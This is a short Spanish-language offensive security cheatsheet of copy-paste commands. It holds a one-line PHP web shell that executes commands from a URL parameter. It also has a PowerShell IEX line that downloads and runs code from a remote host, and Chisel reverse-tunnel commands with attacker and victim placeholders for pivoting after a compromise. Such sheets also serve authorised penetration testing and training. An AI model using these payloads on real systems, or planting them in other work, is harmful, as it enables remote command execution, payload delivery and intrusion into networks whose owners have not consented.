# Cheatsheet
Cosas copypaste

# Reverse Shells

Web Shell PHP
```
<?php system($_GET[cmd]);?>
```

# Powershell

Descargar binarios
```
powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
```

# PostExplotacion

## Chisel

Servidor
```
./chisel server --reverse -p ATACKER_PORT
```

Cliente
```
./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
```


